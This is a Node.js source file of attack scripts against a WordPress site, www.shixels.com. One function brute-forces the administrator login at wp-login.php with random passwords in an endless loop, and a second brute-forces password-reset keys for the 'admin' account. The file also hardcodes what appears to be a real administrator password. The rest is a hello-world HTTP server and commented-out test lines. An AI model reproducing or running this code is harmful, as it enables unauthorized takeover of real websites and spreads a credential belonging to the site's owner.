const utils=require("./utils");
function searchword(dictionary){
	utils.key_dictionary(6,function($a){
		if(dictionary[$a]=="1"){
			console.log($a+" found in database");
			console.log(utils.sleep(3));
		}else{
			console.log($a);
		}
	},"9a");
}
// utils.word_matrix([["damola"],['0','1','2','3','4','5','6','7','8','9'],['','!','@','#','$',"%","^","&","*","(",")"]]).forEach(function(value,index){
// 	console.log(value);
// });
// while(true){
// 	// console.log(utils.wp_rand(0,1));
// 	console.log(utils.wp_generate_password(12));
// 	// utils.sleep(1000);
// }
// console.log(utils.powerof(72,13));
// console.log(Math.pow(72,13));
global.JOB={};
passRandomString=function(){
	global.JOB.passRandomString=true;
	var gen=1;
	// $possible=12312;
	var possible=Math.pow(72,13);
	var average=5.04;
	var totalwait=((possible*average)/60)/60;
	var timestart=Date.now();
	var datestarted=new Date(timestart).toLocaleString();
	console.log("Job started at "+datestarted);
	console.log("Job will take "+totalwait+" Hours to end");
	var $browser=new utils.FakeBrowser();
	$browser.setURL("https://www.shixels.com/wp-login.php");
	console.log($browser.getURL());
	$browser.setBrowserMethod("POST");
	$browser.setBrowserHost("www.shixels.com");
	$browser.setBrowserConnection("keep-alive");
	$browser.setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
	var $formData={
		"testcookie":1,
		"log":"admin",
		"pwd":"q@yW1UusaRnPi@q6rn",
		"rememberme":"forever",
		"wp-submit": "Log In",
		"redirect_to":"https://www.shixels.com"
	};
	function callJob(){
		const loopstart=Date.now();
		$formData['pwd']=utils.wp_generate_password(18);
		// password q@yW1UusaRnPi@q6rn

		console.log("Try "+gen+" of "+possible);
		console.log("With random string "+$formData.pwd);
		$browser.setBrowserContent($formData);
		$browser.callback=function ($res){
			var login_error=1;
			const loopend=Date.now();
			const loopdiff=loopend-loopstart;
			console.log("Job took "+loopdiff/100+" seconds");
			console.log($res["header"]);
			// console.log($browser.getBrowser("http"));
			for($k in $res['header']['set-cookie']) {
				 // code...
				const head=$res['header']['set-cookie'][$k];
				if(head.match(/wordpress_[^test_cookie]/i)){
					login_error=0;
				}
			}
			if(login_error==0){
				const timeend=Date.now();
				const timediff=timeend-timestart;
				const dateended=new Date(timeend).toLocaleString();
				console.log("Job ended at "+dateended);
				console.log("Job took "+ timediff/100+" seconds");
				// write_to_file("../database/passwordreset.key",$browser.getURL()." key=".$key);
				// exec("vlc ../audio/audio.mp3");
				global.JOB.passRandomString=false;
			}
			if(global.JOB.passRandomString){
				callJob();
			}else{
				console.log("JOB DONE");
			}
		}
		$browser.run();
		gen++;
	}
	callJob();
}

 forcepassword_reset=function(){
	global.JOB.forcepassword_reset=true;
	var gen=1;
	// $possible=12312;
	var possible=Math.pow(72,13);
	var average=5.04;
	var totalwait=((possible*average)/60)/60;
	var timestart=Date.now();
	var datestarted=new Date(timestart).toLocaleString();
	console.log("Job started at "+datestarted);
	console.log("Job will take "+totalwait+" Hours to end");
	var $browser=new utils.FakeBrowser();
	function callJob(){
		const loopstart=Date.now();
		var key=utils.wp_generate_password( 20, false ),
			login="admin";
		console.log("Try "+gen+" of "+possible);
		console.log("With random string "+key);
		$browser.setURL("https://www.shixels.com/wp-login.php");
		console.log($browser.getURL());
		$browser.setBrowserMethod("GET");
		$browser.setBrowserHost("www.shixels.com");
		$browser.setBrowserConnection("keep-alive");
		$browser.setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
		$browser.setBrowserQueryString({action:"rp",key:key,login:login});
		$browser.run(function ($res){
			$browser.setURL("https://www.shixels.com/wp-login.php");
			console.log($browser.getURL());
			$browser.setBrowserMethod("GET");
			$browser.setBrowserHost("www.shixels.com");
			$browser.setBrowserConnection("keep-alive");
			$browser.clearCookiesjar();
			$browser.setBrowserCookies(["wordpress_test_cookie=WP+Cookie+check;"]);
			var $setCookie=$browser.getSet_Cookie($res['header']['set-cookie']);
			$browser.setBrowserCookies($setCookie);
			$browser.setBrowserQueryString({action:"rp"});
			$browser.run(function($res2){
				var login_error=1;
				const loopend=Date.now();
				const loopdiff=loopend-loopstart;
				console.log("Job took "+loopdiff/100+" seconds");
				console.log($res2.header)
				if($res2['status']=="HTTP/1.1 200 OK"){
					login_error=0;
				}
				if(login_error==0){
					const timeend=Date.now();
					const timediff=timeend-timestart;
					const dateended=new Date(timeend).toLocaleString();
					console.log("Job ended at "+dateended);
					console.log("Job took "+ timediff/100+" seconds");
					// write_to_file("../database/passwordreset.key",$browser.getURL()." key=".$key);
					// exec("vlc ../audio/audio.mp3");
					global.JOB.forcepassword_reset=false;
				}
				if(global.JOB.forcepassword_reset){
					callJob();
				}else{
					console.log("JOB DONE");
				}
			
			});
		});
		gen++;
	}
	callJob();
}


const http = require("http");
const hostname = '127.0.0.1';
const port = 3000;

//Create HTTP server and listen on port 3000 for requests
const server = http.createServer((req, res) => {

  //Set the response HTTP header with HTTP status and Content type
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end('Hello World\n');
});

//listen for request on port 3000, and as a callback function have the port listened on logged
server.listen(port, hostname, () => {
  console.log(`Server running at http://${hostname}:${port}/`);
});

// passRandomString();
// forcepassword_reset();


// var httpRequest=require('request');
// httpRequest({
// 	method:"POST",
// 	url:"http://localhost",
// 	headers:{
// 		"User-Agent":"",
// 		"Cookie":""
// 	},
// 	form:{name:"damola",password:"damola123"}
// },function(error,response,body){
// 	console.error("Error:",error);
// 	console.info(response);
// 	console.log(body);

// });
// utils.get_json("../database/words_dictionary.json",searchword)
// console.log(utils.increment("    -    -   -   "));